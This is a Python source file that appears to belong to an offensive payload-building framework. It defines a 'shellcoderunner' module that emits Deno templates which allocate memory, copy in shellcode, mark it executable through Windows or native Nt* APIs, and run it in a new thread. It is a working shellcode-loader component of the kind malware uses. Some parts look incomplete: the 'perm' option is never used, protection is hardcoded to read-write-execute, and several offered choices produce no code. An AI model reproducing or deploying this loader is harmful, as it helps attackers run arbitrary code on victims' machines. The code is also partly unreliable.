from common.utils.argumentparser import ArgumentParser

class shellcoderunner:
    def __init__(self, arguments):
        parser = ArgumentParser(modulename=self.__class__.__name__)
        parser.add_argument(name='allocate', default='VirtualAlloc', help='Function used for allocating memory', choices={'VirtualAlloc', 'HeapAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx'})
        parser.add_argument(name='copy', default='memcpy', help='Function used for copying memory', choices={'memcpy', 'WriteProcessMemory', 'NtWriteVirtualMemory'})
        parser.add_argument(name='protect', default='VirtualProtect', help='Function used for changing memory protections', choices={'VirtualProtect', 'NtProtectVirtualMemory'})
        parser.add_argument(name='execute', default='CreateThread', help='Function used for executing shellcode', choices={'CreateThread', 'NtCreateThreadEx'})
        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish', choices={'WaitForSingleObject', 'NtWaitForSingleObject'})
        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle', 'NtClose'})
        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
        self.args = parser.parse_args(arguments)

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        template = """
    {transformers}
"""


        if self.args['allocate'] == 'VirtualAlloc':
            template += """
    const address = {VirtualAlloc}(null, {shellcodeSize}, 0x3000, 0x4);
"""
        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
            template += """
    var baseAddress = new BigUint64Array([0n]);
    var regionSize = new BigUint64Array([{shellcodeSize}n]);
    {NtAllocateVirtualMemory}(Deno.UnsafePointer.create(-1n), baseAddress, Deno.UnsafePointer.create(0), regionSize, 0x3000, 0x4);
    const address = Deno.UnsafePointer.create(baseAddress[0]);
"""

        if self.args['copy'] == 'memcpy':
            template += """
    const view = Deno.UnsafePointerView.getArrayBuffer(address, {shellcodeSize});
    const destView = new Uint8Array(view);
    destView.set(shellcode);
"""

        if self.args['protect'] == 'VirtualProtect':
            template += """
    const oldProtect = new Uint8Array(4);
    {VirtualProtect}(address, {shellcodeSize}, 0x40, oldProtect)
"""

        if self.args['execute'] == 'CreateThread':
            template += """
    const threadIdBuffer = new Uint32Array(1);
    const hThread = {CreateThread}(null, 0, address, null, 0, null);
"""

        if self.args['wait'] == 'WaitForSingleObject':
            template += """
    {WaitForSingleObject}(hThread, 0xFFFFFFFF);
"""

        return template